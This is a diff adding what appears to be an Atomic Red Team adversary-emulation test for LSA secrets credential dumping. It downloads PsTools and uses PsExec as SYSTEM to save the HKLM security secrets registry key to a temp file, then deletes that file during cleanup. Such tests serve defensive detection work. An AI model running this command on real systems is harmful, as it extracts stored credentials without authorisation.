@@ -1,0 +1,16 @@
+#TechniqueName: OS Credential Dumping: LSA Secrets
+#AtomicTestName: Dumping LSA Secrets
+#Description: Dump secrets key from Windows registry&When successful, the dumped file will be written to $env:Temp\secrets.&Attackers may use the secrets key to assist with extracting passwords and enumerating other sensitive system information.&https://pentestlab.blog/2018/04/04/dumping-clear-text-credentials/#:~:text=LSA%20Secrets%20is%20a%20registry,host%2C%20local%20security%20policy%20etc.&
+#Language: cmd
+
+#get_prereq_commands
+Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PSTools.zip"
+Expand-Archive $env:TEMP\PSTools.zip $env:TEMP\PSTools -Force
+New-Item -ItemType Directory (Split-Path PathToAtomicsFolder\T1003.004\bin\PsExec.exe) -Force | Out-Null
+Copy-Item $env:TEMP\PSTools\PsExec.exe PathToAtomicsFolder\T1003.004\bin\PsExec.exe -Force
+
+#commands
+PathToAtomicsFolder\T1003.004\bin\PsExec.exe -accepteula -s reg save HKLM\security\policy\secrets %temp%\secrets
+
+#cleanup_commands
+del %temp%\secrets >nul 2> nul
